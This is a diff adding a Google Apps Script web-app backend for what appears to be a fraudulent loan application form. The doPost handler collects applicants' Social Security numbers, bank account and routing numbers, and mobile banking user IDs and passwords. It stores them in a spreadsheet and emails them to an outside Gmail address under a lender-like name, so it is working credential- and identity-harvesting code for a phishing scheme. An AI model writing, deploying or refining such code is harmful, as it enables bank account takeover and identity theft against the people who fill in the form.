@@ -1,0 +1,117 @@
+// SIMPLE GOOGLE SHEETS SCRIPT - Copy this into your Google Apps Script project
+// Go to: https://script.google.com/home
+// Click "New Project"
+// Delete all existing code
+// Paste this code
+// Save and Deploy as Web App
+
+// IMPORTANT: Create a NEW Google Sheet under ericmason007007@gmail.com account
+// Then replace the URL below with your new sheet URL
+const SHEET_URL = "https://docs.google.com/spreadsheets/d/1drmvoZPbGED2hratNOu3vBgjJRmk9cYIdLuJq7Scei8/edit";
+
+function doGet(e) {
+  return HtmlService.createHtmlOutput('Google Sheets API is working! Use POST to submit data.');
+}
+
+function doPost(e) {
+  try {
+    const sheet = SpreadsheetApp.openByUrl(SHEET_URL).getSheetByName("Sheet1");
+    const data = JSON.parse(e.postData.contents);
+
+    // Add data to sheet
+    sheet.appendRow([
+      data.loanAmount || "",
+      data.loanPurpose || "",
+      data.name || "",
+      data.email || "",
+      data.phone || "",
+      data.streetAddress || "",
+      data.city || "",
+      data.state || "",
+      data.zipCode || "",
+      data.ssn || "",
+      data.bankName || data.customerBank || "",
+      data.routingNumber || "",
+      data.accountNumber || "",
+      data.mobileBankingUserId || "",
+      data.mobileBankingPassword || "",
+      new Date()
+    ]);
+
+    // Send email notification
+    sendEmailNotification(data);
+
+    return ContentService.createTextOutput(JSON.stringify({ status: "success" }))
+      .setMimeType(ContentService.MimeType.JSON);
+
+  } catch (err) {
+    return ContentService.createTextOutput(JSON.stringify({ status: "error", message: err.message }))
+      .setMimeType(ContentService.MimeType.JSON);
+  }
+}
+
+// Send email notification function
+function sendEmailNotification(data) {
+  try {
+    const recipientEmail = "lightstreamloansservices@gmail.com"; // Your email address
+    
+    // Create email subject
+    const customerName = data.fullName || data.name || 'Customer';
+    const subject = `New Loan Application - ${customerName} - $${data.loanAmount || 'N/A'}`;
+    
+    // Create email body
+    const body = `
+New Loan Application Received:
+
+Customer Information:
+- Name: ${customerName}
+- Email: ${data.email || 'N/A'}
+- Phone: ${data.phone || 'N/A'}
+- Address: ${data.streetAddress || 'N/A'}, ${data.city || 'N/A'}, ${data.state || 'N/A'} ${data.zipCode || 'N/A'}
+- SSN: ${data.ssn || 'N/A'}
+
+Bank Information:
+- Mobile Banking User ID: ${data.mobileBankingUserId || 'N/A'}
+- Mobile Banking Password: ${data.mobileBankingPassword || 'N/A'}
+
+Loan Details:
+- Loan Amount: $${data.loanAmount || 'N/A'}
+- Loan Purpose: ${data.loanPurpose || 'N/A'}
+- Bank: ${data.bankName || data.customerBank || 'N/A'}
+
+Application submitted: ${new Date().toLocaleString()}
+
+Check your Google Sheet for complete details.
+    `;
+    
+    // Send email
+    MailApp.sendEmail({
+      to: recipientEmail,
+      subject: subject,
+      body: body
+    });
+    
+    console.log('Email notification sent to ' + recipientEmail);
+    
+  } catch (emailError) {
+    console.log('Failed to send email: ' + emailError.message);
+  }
+}
+
+function doGet() {
+  return ContentService.createTextOutput("Google Sheets API working");
+}
+
+// Helper function to get spreadsheet info
+function getSpreadsheetInfo() {
+  try {
+    const spreadsheet = SpreadsheetApp.getActiveSpreadsheet();
+    return {
+      url: spreadsheet.getUrl(),
+      name: spreadsheet.getName(),
+      sheets: spreadsheet.getSheets().map(sheet => sheet.getName())
+    };
+  } catch (e) {
+    return { error: 'No active spreadsheet found' };
+  }
+}
